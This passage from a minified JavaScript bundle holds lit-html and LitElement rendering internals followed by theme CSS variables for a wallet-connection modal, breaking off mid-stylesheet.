const Id=globalThis,pg=Id.trustedTypes,z6=pg?pg.createPolicy("lit-html",{createHTML:e=>e}):void 0,EA="$lit$",bc=`lit$${(Math.random()+"").slice(9)}$`,xA="?"+bc,DB=`<${xA}>`,Bl=document,Vd=()=>Bl.createComment(""),Gd=e=>null===e||"object"!=typeof e&&"function"!=typeof e,SA=Array.isArray,$B=e=>SA(e)||"function"==typeof(null==e?void 0:e[Symbol.iterator]),uw="[ \t\n\f\r]",Zh=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,H6=/-->/g,q6=/>/g,vl=RegExp(`>|${uw}(?:([^\\s"'>=/]+)(${uw}*=${uw}*(?:[^ \t\n\f\r"'\`<>=]|("|')|))|$)`,"g"),V6=/'/g,G6=/"/g,CA=/^(?:script|style|textarea|title)$/i,AA=e=>(t,...r)=>({_$litType$:e,strings:t,values:r}),pe=AA(1),ze=AA(2),Fl=Symbol.for("lit-noChange"),sn=Symbol.for("lit-nothing"),K6=new WeakMap,Nl=Bl.createTreeWalker(Bl,129);function IA(e,t){if(!Array.isArray(e)||!e.hasOwnProperty("raw"))throw Error("invalid template strings array");return void 0!==z6?z6.createHTML(t):t}const LB=(e,t)=>{const r=e.length-1,n=[];let i,o=2===t?"<svg>":"",s=Zh;for(let t=0;t<r;t++){const r=e[t];let a,c,l=-1,u=0;for(;u<r.length&&(s.lastIndex=u,c=s.exec(r),null!==c);)u=s.lastIndex,s===Zh?"!--"===c[1]?s=H6:void 0!==c[1]?s=q6:void 0!==c[2]?(CA.test(c[2])&&(i=RegExp("</"+c[2],"g")),s=vl):void 0!==c[3]&&(s=vl):s===vl?">"===c[0]?(s=i??Zh,l=-1):void 0===c[1]?l=-2:(l=s.lastIndex-c[2].length,a=c[1],s=void 0===c[3]?vl:'"'===c[3]?G6:V6):s===G6||s===V6?s=vl:s===H6||s===q6?s=Zh:(s=vl,i=void 0);const h=s===vl&&e[t+1].startsWith("/>")?" ":"";o+=s===Zh?r+DB:l>=0?(n.push(a),r.slice(0,l)+EA+r.slice(l)+bc+h):r+bc+(-2===l?t:h)}return[IA(e,o+(e[r]||"<?>")+(2===t?"</svg>":"")),n]};let Yy=class e{constructor({strings:t,_$litType$:r},n){let i;this.parts=[];let o=0,s=0;const a=t.length-1,c=this.parts,[l,u]=LB(t,r);if(this.el=e.createElement(l,n),Nl.currentNode=this.el.content,2===r){const e=this.el.content.firstChild;e.replaceWith(...e.childNodes)}for(;null!==(i=Nl.nextNode())&&c.length<a;){if(1===i.nodeType){if(i.hasAttributes())for(const e of i.getAttributeNames())if(e.endsWith(EA)){const t=u[s++],r=i.getAttribute(e).split(bc),n=/([.?@])?(.*)/.exec(t);c.push({type:1,index:o,name:n[2],strings:r,ctor:"."===n[1]?FB:"?"===n[1]?jB:"@"===n[1]?UB:hv}),i.removeAttribute(e)}else e.startsWith(bc)&&(c.push({type:6,index:o}),i.removeAttribute(e));if(CA.test(i.tagName)){const e=i.textContent.split(bc),t=e.length-1;if(t>0){i.textContent=pg?pg.emptyScript:"";for(let r=0;r<t;r++)i.append(e[r],Vd()),Nl.nextNode(),c.push({type:2,index:++o});i.append(e[t],Vd())}}}else if(8===i.nodeType)if(i.data===xA)c.push({type:2,index:o});else{let e=-1;for(;-1!==(e=i.data.indexOf(bc,e+1));)c.push({type:7,index:o}),e+=bc.length-1}o++}}static createElement(e,t){const r=Bl.createElement("template");return r.innerHTML=e,r}};function _f(e,t,r=e,n){var i,o;if(t===Fl)return t;let s=void 0!==n?null==(i=r._$Co)?void 0:i[n]:r._$Cl;const a=Gd(t)?void 0:t._$litDirective$;return(null==s?void 0:s.constructor)!==a&&(null==(o=null==s?void 0:s._$AO)||o.call(s,!1),void 0===a?s=void 0:(s=new a(e),s._$AT(e,r,n)),void 0!==n?(r._$Co??(r._$Co=[]))[n]=s:r._$Cl=s),void 0!==s&&(t=_f(e,s._$AS(e,t.values),s,n)),t}let BB=class{constructor(e,t){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=t}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){const{el:{content:t},parts:r}=this._$AD,n=((null==e?void 0:e.creationScope)??Bl).importNode(t,!0);Nl.currentNode=n;let i=Nl.nextNode(),o=0,s=0,a=r[0];for(;void 0!==a;){if(o===a.index){let t;2===a.type?t=new x3(i,i.nextSibling,this,e):1===a.type?t=new a.ctor(i,a.name,a.strings,this,e):6===a.type&&(t=new WB(i,this,e)),this._$AV.push(t),a=r[++s]}o!==(null==a?void 0:a.index)&&(i=Nl.nextNode(),o++)}return Nl.currentNode=Bl,n}p(e){let t=0;for(const r of this._$AV)void 0!==r&&(void 0!==r.strings?(r._$AI(e,r,t),t+=r.strings.length-2):r._$AI(e[t])),t++}},x3=class e{get _$AU(){var e;return(null==(e=this._$AM)?void 0:e._$AU)??this._$Cv}constructor(e,t,r,n){this.type=2,this._$AH=sn,this._$AN=void 0,this._$AA=e,this._$AB=t,this._$AM=r,this.options=n,this._$Cv=(null==n?void 0:n.isConnected)??!0}get parentNode(){let e=this._$AA.parentNode;const t=this._$AM;return void 0!==t&&11===(null==e?void 0:e.nodeType)&&(e=t.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,t=this){e=_f(this,e,t),Gd(e)?e===sn||null==e||""===e?(this._$AH!==sn&&this._$AR(),this._$AH=sn):e!==this._$AH&&e!==Fl&&this._(e):void 0!==e._$litType$?this.g(e):void 0!==e.nodeType?this.$(e):$B(e)?this.T(e):this._(e)}k(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}$(e){this._$AH!==e&&(this._$AR(),this._$AH=this.k(e))}_(e){this._$AH!==sn&&Gd(this._$AH)?this._$AA.nextSibling.data=e:this.$(Bl.createTextNode(e)),this._$AH=e}g(e){var t;const{values:r,_$litType$:n}=e,i="number"==typeof n?this._$AC(e):(void 0===n.el&&(n.el=Yy.createElement(IA(n.h,n.h[0]),this.options)),n);if((null==(t=this._$AH)?void 0:t._$AD)===i)this._$AH.p(r);else{const e=new BB(i,this),t=e.u(this.options);e.p(r),this.$(t),this._$AH=e}}_$AC(e){let t=K6.get(e.strings);return void 0===t&&K6.set(e.strings,t=new Yy(e)),t}T(t){SA(this._$AH)||(this._$AH=[],this._$AR());const r=this._$AH;let n,i=0;for(const o of t)i===r.length?r.push(n=new e(this.k(Vd()),this.k(Vd()),this,this.options)):n=r[i],n._$AI(o),i++;i<r.length&&(this._$AR(n&&n._$AB.nextSibling,i),r.length=i)}_$AR(e=this._$AA.nextSibling,t){var r;for(null==(r=this._$AP)||r.call(this,!1,!0,t);e&&e!==this._$AB;){const t=e.nextSibling;e.remove(),e=t}}setConnected(e){var t;void 0===this._$AM&&(this._$Cv=e,null==(t=this._$AP)||t.call(this,e))}},hv=class{get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}constructor(e,t,r,n,i){this.type=1,this._$AH=sn,this._$AN=void 0,this.element=e,this.name=t,this._$AM=n,this.options=i,r.length>2||""!==r[0]||""!==r[1]?(this._$AH=Array(r.length-1).fill(new String),this.strings=r):this._$AH=sn}_$AI(e,t=this,r,n){const i=this.strings;let o=!1;if(void 0===i)e=_f(this,e,t,0),o=!Gd(e)||e!==this._$AH&&e!==Fl,o&&(this._$AH=e);else{const n=e;let s,a;for(e=i[0],s=0;s<i.length-1;s++)a=_f(this,n[r+s],t,s),a===Fl&&(a=this._$AH[s]),o||(o=!Gd(a)||a!==this._$AH[s]),a===sn?e=sn:e!==sn&&(e+=(a??"")+i[s+1]),this._$AH[s]=a}o&&!n&&this.O(e)}O(e){e===sn?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,e??"")}},FB=class extends hv{constructor(){super(...arguments),this.type=3}O(e){this.element[this.name]=e===sn?void 0:e}},jB=class extends hv{constructor(){super(...arguments),this.type=4}O(e){this.element.toggleAttribute(this.name,!!e&&e!==sn)}},UB=class extends hv{constructor(e,t,r,n,i){super(e,t,r,n,i),this.type=5}_$AI(e,t=this){if((e=_f(this,e,t,0)??sn)===Fl)return;const r=this._$AH,n=e===sn&&r!==sn||e.capture!==r.capture||e.once!==r.once||e.passive!==r.passive,i=e!==sn&&(r===sn||n);n&&this.element.removeEventListener(this.name,this,r),i&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){var t;"function"==typeof this._$AH?this._$AH.call((null==(t=this.options)?void 0:t.host)??this.element,e):this._$AH.handleEvent(e)}},WB=class{constructor(e,t,r){this.element=e,this.type=6,this._$AN=void 0,this._$AM=t,this.options=r}get _$AU(){return this._$AM._$AU}_$AI(e){_f(this,e)}};const fw=Id.litHtmlPolyfillSupport;null==fw||fw(Yy,x3),(Id.litHtmlVersions??(Id.litHtmlVersions=[])).push("3.0.2");const zB=(e,t,r)=>{const n=(null==r?void 0:r.renderBefore)??t;let i=n._$litPart$;if(void 0===i){const e=(null==r?void 0:r.renderBefore)??null;n._$litPart$=i=new x3(t.insertBefore(Vd(),e),e,void 0,r??{})}return i._$AI(e),i
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */};let $e=class extends Zu{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){var e;const t=super.createRenderRoot();return(e=this.renderOptions).renderBefore??(e.renderBefore=t.firstChild),t}update(e){const t=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=zB(t,this.renderRoot,this.renderOptions)}connectedCallback(){var e;super.connectedCallback(),null==(e=this._$Do)||e.setConnected(!0)}disconnectedCallback(){var e;super.disconnectedCallback(),null==(e=this._$Do)||e.setConnected(!1)}render(){return Fl}};var wA;$e._$litElement$=!0,$e.finalized=!0,null==(wA=globalThis.litElementHydrateSupport)||wA.call(globalThis,{LitElement:$e});const hw=globalThis.litElementPolyfillSupport;let Rd,Ic,Rc;function HB(e,t){Rd=document.createElement("style"),Ic=document.createElement("style"),Rc=document.createElement("style"),Rd.textContent=sf(e).core.cssText,Ic.textContent=sf(e).dark.cssText,Rc.textContent=sf(e).light.cssText,document.head.appendChild(Rd),document.head.appendChild(Ic),document.head.appendChild(Rc),NA(t)}function NA(e){Ic&&Rc&&("light"===e?(Ic.removeAttribute("media"),Rc.media="enabled"):(Rc.removeAttribute("media"),Ic.media="enabled"))}function qB(e){Rd&&Ic&&Rc&&(Rd.textContent=sf(e).core.cssText,Ic.textContent=sf(e).dark.cssText,Rc.textContent=sf(e).light.cssText)}function sf(e){return{core:Qe`
      :root {
        --w3m-color-mix-strength: ${ko(null!=e&&e["--w3m-color-mix-strength"]?`${e["--w3m-color-mix-strength"]}%`:"0%")};
        --w3m-font-family: ${ko((null==e?void 0:e["--w3m-font-family"])||"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif")};
        --w3m-font-size-master: ${ko((null==e?void 0:e["--w3m-font-size-master"])||"10px")};
        --w3m-border-radius-master: ${ko((null==e?void 0:e["--w3m-border-radius-master"])||"4px")};
        --w3m-z-index: ${ko((null==e?void 0:e["--w3m-z-index"])||100)};

        --wui-font-family: var(--w3m-font-family);

        --wui-font-size-micro: var(--w3m-font-size-master);
        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);

        --wui-border-radius-5xs: var(--w3m-border-radius-master);
        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);

        --wui-font-weight-light: 400;
        --wui-font-weight-regular: 500;
        --wui-font-weight-medium: 600;
        --wui-font-weight-bold: 700;

        --wui-letter-spacing-large: -0.8px;
        --wui-letter-spacing-paragraph: -0.64px;
        --wui-letter-spacing-small: -0.56px;
        --wui-letter-spacing-tiny: -0.48px;
        --wui-letter-spacing-micro: -0.2px;

        --wui-spacing-0: 0px;
        --wui-spacing-4xs: 2px;
        --wui-spacing-3xs: 4px;
        --wui-spacing-xxs: 6px;
        --wui-spacing-2xs: 7px;
        --wui-spacing-xs: 8px;
        --wui-spacing-1xs: 10px;
        --wui-spacing-s: 12px;
        --wui-spacing-m: 14px;
        --wui-spacing-l: 16px;
        --wui-spacing-2l: 18px;
        --wui-spacing-xl: 20px;
        --wui-spacing-xxl: 24px;
        --wui-spacing-2xl: 32px;
        --wui-spacing-3xl: 40px;
        --wui-spacing-4xl: 90px;

        --wui-icon-box-size-xs: 20px;
        --wui-icon-box-size-sm: 24px;
        --wui-icon-box-size-md: 32px;
        --wui-icon-box-size-lg: 40px;

        --wui-icon-size-inherit: inherit;
        --wui-icon-size-xxs: 10px;
        --wui-icon-size-xs: 12px;
        --wui-icon-size-sm: 14px;
        --wui-icon-size-md: 16px;
        --wui-icon-size-mdl: 18px;
        --wui-icon-size-lg: 20px;

        --wui-wallet-image-size-inherit: inherit;
        --wui-wallet-image-size-sm: 40px;
        --wui-wallet-image-size-md: 56px;
        --wui-wallet-image-size-lg: 80px;

        --wui-box-size-md: 100px;
        --wui-box-size-lg: 120px;

        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);

        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);

        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);

        --wui-duration-lg: 200ms;
        --wui-duration-md: 125ms;
        --wui-duration-sm: 75ms;

        --wui-path-network: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --wui-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --wui-color-inherit: inherit;

        --wui-color-inverse-100: #fff;
        --wui-color-inverse-000: #000;

        --wui-cover: rgba(0, 0, 0, 0.3);

        --wui-color-modal-bg: var(--wui-color-modal-bg-base);

        --wui-color-blue-100: var(--wui-color-blue-base-100);
        --wui-color-blue-015: var(--wui-color-accent-base-015);

        --wui-color-accent-100: var(--wui-color-accent-base-100);
        --wui-color-accent-090: var(--wui-color-accent-base-090);
        --wui-color-accent-080: var(--wui-color-accent-base-080);

        --wui-accent-glass-090: var(--wui-accent-glass-base-090);
        --wui-accent-glass-080: var(--wui-accent-glass-base-080);
        --wui-accent-glass-020: var(--wui-accent-glass-base-020);
        --wui-accent-glass-015: var(--wui-accent-glass-base-015);
        --wui-accent-glass-010: var(--wui-accent-glass-base-010);
        --wui-accent-glass-005: var(--wui-accent-glass-base-005);
        --wui-accent-glass-002: var(--wui-accent-glass-base-002);

        --wui-color-fg-100: var(--wui-color-fg-base-100);
        --wui-color-fg-125: var(--wui-color-fg-base-125);
        --wui-color-fg-150: var(--wui-color-fg-base-150);
        --wui-color-fg-175: var(--wui-color-fg-base-175);
        --wui-color-fg-200: var(--wui-color-fg-base-200);
        --wui-color-fg-225: var(--wui-color-fg-base-225);
        --wui-color-fg-250: var(--wui-color-fg-base-250);
        --wui-color-fg-275: var(--wui-color-fg-base-275);
        --wui-color-fg-300: var(--wui-color-fg-base-300);

        --wui-color-bg-100: var(--wui-color-bg-base-100);
        --wui-color-bg-125: var(--wui-color-bg-base-125);
        --wui-color-bg-150: var(--wui-color-bg-base-150);
        --wui-color-bg-175: var(--wui-color-bg-base-175);
        --wui-color-bg-200: var(--wui-color-bg-base-200);
        --wui-color-bg-225: var(--wui-color-bg-base-225);
        --wui-color-bg-250: var(--wui-color-bg-base-250);
        --wui-color-bg-275: var(--wui-color-bg-base-275);
        --wui-color-bg-300: var(--wui-color-bg-base-300);

        --wui-color-success-100: var(--wui-color-success-base-100);
        --wui-color-error-100: var(--wui-color-error-base-100);

        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);

        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-base-100);

        --wui-avatar-border: var(--wui-avatar-border-base);

        --wui-thumbnail-border: var(--wui-thumbnail-border-base);

        --wui-box-shadow-blue: rgba(71, 161, 255, 0.16);
      }

      @supports (background: color-mix(in srgb, white 50%, black)) {
        :root {
          --wui-color-modal-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-modal-bg-base)
          );

          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 16%, transparent);

          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            var(--w3m-default)
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            var(--w3m-default)
          );

          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );

          --wui-accent-glass-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-accent-glass-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-accent-glass-020: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 20%,
            transparent
          );
          --wui-accent-glass-015: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 15%,
            transparent
          );
          --wui-accent-glass-010: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 10%,
            transparent
          );
          --wui-accent-glass-005: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 5%,
            transparent
          );
          --wui-color-accent-002: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 2%,
            transparent
          );

          --wui-color-fg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-100)
          );
          --wui-color-fg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-125)
          );
          --wui-color-fg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-150)
          );
          --wui-color-fg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-175)
          );
          --wui-color-fg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-200)
          );
          --wui-color-fg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-225)
          );
          --wui-color-fg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-250)
          );
          --wui-color-fg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-275)
          );
          --wui-color-fg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-300)
          );

          --wui-color-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-100)
          );
          --wui-color-bg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-125)
          );
          --wui-color-bg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-150)
          );
          --wui-color-bg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-175)
          );
          --wui-color-bg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-200)
          );
          --wui-color-bg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-225)
          );
          --wui-color-bg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-250)
          );
          --wui-color-bg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-275)
          );
          --wui-color-bg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-300)
          );

          --wui-color-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-100)
          );
          --wui-color-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-100)
          );

          --wui-icon-box-bg-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-error-base-100)
          );
          --wui-icon-box-bg-accent-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-blue-base-100)
          );
          --wui-icon-box-bg-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-success-base-100)
          );
          --wui-icon-box-bg-inverse-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-inverse-base-100)
          );

          --wui-all-wallets-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-all-wallets-bg-base-100)
          );

          --wui-avatar-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-avatar-border-base)
          );

          --wui-thumbnail-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-thumbnail-border-base)
          );
        }
      }
    `,light:Qe`
      :root {
        --w3m-color-mix: ${ko((null==e?void 0:e["--w3m-color-mix"])||"#fff")};
        --w3m-accent: ${ko((null==e?void 0:e["--w3m-accent"])||"#47a1ff")};
        --w3m-default: #fff;

        --wui-color-modal-bg-base: #191a1a;

        --wui-color-blue-base-100: #47a1ff;

        --wui-color-accent-base-100: var(--w3m-accent);
        --wui-color-accent-base-090: #59aaff;
        --wui-color-accent-base-080: #6cb4ff;

        --wui-accent-glass-base-090: rgba(71, 161, 255, 0.9);
        --wui-accent-glass-base-080: rgba(71, 161, 255, 0.8);
        --wui-accent-glass-base-020: rgba(71, 161, 255, 0.2);
        --wui-accent-glass-base-015: rgba(71, 161, 255, 0.15);
        --wui-accent-glass-base-010: rgba(71, 161, 255, 0.1);
        --wui-accent-glass-base-005: rgba(71, 161, 255, 0.05);
        --wui-accent-glass-base-002: rgba(71, 161, 255, 0.02);

        --wui-color-fg-base-100: #e4e7e7;
        --wui-color-fg-base-125: #d0d5d5;
        --wui-color-fg-base-150: #a8b1b1;
        --wui-color-fg-base-175: #a8b0b0;
        --wui-color-fg-base-200: #949e9e;
        --wui-color-fg-base-225: #868f8f;
        --wui-color-fg-base-250: #788080;
        --wui-color-fg-base-275: #788181;
        --wui-color-fg-base-300: #6e7777;

        --wui-color-bg-base-100: #141414;
        --wui-color-bg-base-125: #191a1a;
        --wui-color-bg-base-150: #1e1f1f;
        --wui-color-bg-base-175: #222525;
        --wui-color-bg-base-200: #272a2a;
        --wui-color-bg-base-225: #2c3030;
        --wui-color-bg-base-250: #313535;
        --wui-color-bg-base-275: #363b3b;
        --wui-color-bg-base-300: #3b4040;

        --wui-color-success-base-100: #26d962;
        --wui-color-error-base-100: #f25a67;

        --wui-icon-box-bg-error-base-100: #3c2426;
        --wui-icon-box-bg-blue-base-100: #20303f;
        --wui-icon-box-bg-success-base-100: #1f3a28;
        --wui-icon-box-bg-inverse-base-100: #243240;

        --wui-all-wallets-bg-base-100: #222b35;

        --wui-avatar-border-base: #252525;

        --wui-thumbnail-border-base: #252525;

        --wui-gray-glass-001: rgba(255, 255, 255, 0.01);
        --wui-gray-glass-002: rgba(255, 255, 255, 0.02);
        --wui-gray-glass-005: rgba(255, 255, 255, 0.05);
        --wui-gray-glass-010: rgba(255, 255, 255, 0.1);
        --wui-gray-glass-015: rgba(255, 255, 255, 0.15);
        --wui-gray-glass-020: rgba(255, 255, 255, 0.2);
        --wui-gray-glass-025: rgba(255, 255, 255, 0.25);
        --wui-gray-glass-030: rgba(255, 255, 255, 0.3);
        --wui-gray-glass-060: rgba(255, 255, 255, 0.6);
        --wui-gray-glass-080: rgba(255, 255, 255, 0.8);
      }
    `,dark:Qe`
      :root {
        --w3m-color-mix: ${ko((null==e?void 0:e["--w3m-color-mix"])||"#000")};
        --w3m-accent: ${ko((null==e?void 0:e["--w3m-accent"])||"#3396ff")};
        --w3m-default: #000;

        --wui-color-modal-bg-base: #fff;

        --wui-color-blue-base-100: #3396ff;

        --wui-color-accent-base-100: var(--w3m-accent);
        --wui-color-accent-base-090: #2d7dd2;
        --wui-color-accent-base-080: #2978cc;

        --wui-accent-glass-base-090: rgba(51, 150, 255, 0.9);
        --wui-accent-glass-base-080: rgba(51, 150, 255, 0.8);
        --wui-accent-glass-base-020: rgba(51, 150, 255, 0.2);
        --wui-accent-glass-base-015: rgba(51, 150, 255, 0.15);
        --wui-accent-glass-base-010: rgba(51, 150, 255, 0.1);
        --wui-accent-glass-base-005: rgba(51, 150, 255, 0.05);
        --wui-accent-glass-base-002: rgba(51, 150, 255, 0.02);

        --wui-color-fg-base-100: #141414;
        --wui-color-fg-base-125: #2d3131;
        --wui-color-fg-base-150: #474d4d;
        --wui-color-fg-base-175: #636d6d;
        --wui-color-fg-base-200: #798686;
        --wui-color-fg-base-225: #828f8f;
        --wui-color-fg-base-250: #8b9797;
        --wui-color-fg-base-275: #95a0a0;
        --wui-color-fg-base-300: #9ea9a9;

        --wui-color-bg-base-100: #ffffff;
        --wui-color-bg-base-125: #f5fafa;
        --wui-color-bg-base-150: #f3f8f8;
        --wui-color-bg-base-175: #eef4f4;
        --wui-color-bg-base-200: #eaf1f1;
        --wui-color-bg-base-225: #e5eded;
        --wui-color-bg-base-250: #e1e9e9;
        --wui-color-bg-base-275: #dce7e7;
        --wui-color-bg-base-300: #d8e3e3;

        --wui-color-success-base-100: #26b562;
        --wui-color-error-base-100: #f05142;

        --wui-icon-box-bg-error-base-100: #f4dfdd;
        --wui-icon-box-bg-blue-base-100: #d9ecfb;
        --wui-icon-box-bg-success-base-100: #daf0e4;
        --wui-icon-box-bg-inverse-base-100: #dcecfc;

        --wui-all-wallets-bg-base-100: #e8f1fa;

        --wui-avatar-border-base: #f3f4f4;

        --wui-thumbnail-border-base: #eaefef;

        --wui-gray-glass-001: rgba(0, 0, 0, 0.01);
        --wui-gray-glass-002: rgba(0, 0, 0, 0.02);
        --wui-gray-glass-005: rgba(0, 0, 0, 0.05);
        --wui-gray-glass-010: rgba(0, 0, 0, 0.1);
        --wui-gray-glass-015: rgba(0, 0, 0, 0.15);
        --wui-gray-glass-020: rgba(0, 0, 0, 0.2);
        --wui-gray-glass-025: rgba(0, 0, 0, 0.25);
        --wui-gray-glass-030: rgba(0, 0, 0, 0.3);
        --wui-gray-glass-060: rgba(0, 0, 0, 0.6);
        --wui-gray-glass-080: rgba(0, 0, 0, 0.8);
      }
    `}}null==hw||hw({LitElement:$e}),(globalThis.litElementVersions??(globalThis.litElementVersions=[])).push("4.0.1");const Rt=Qe`
  *,
  *::after,
  *::before,
  :host {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    font-family: var(--wui-font-family);
    backface-visibility: hidden;
  }
`,dn=Qe`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    outline: none;
    border: 1px solid transparent;
    column-gap: var(--wui-spacing-3xs);
    background-color: transparent;
    text-decoration: none;
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
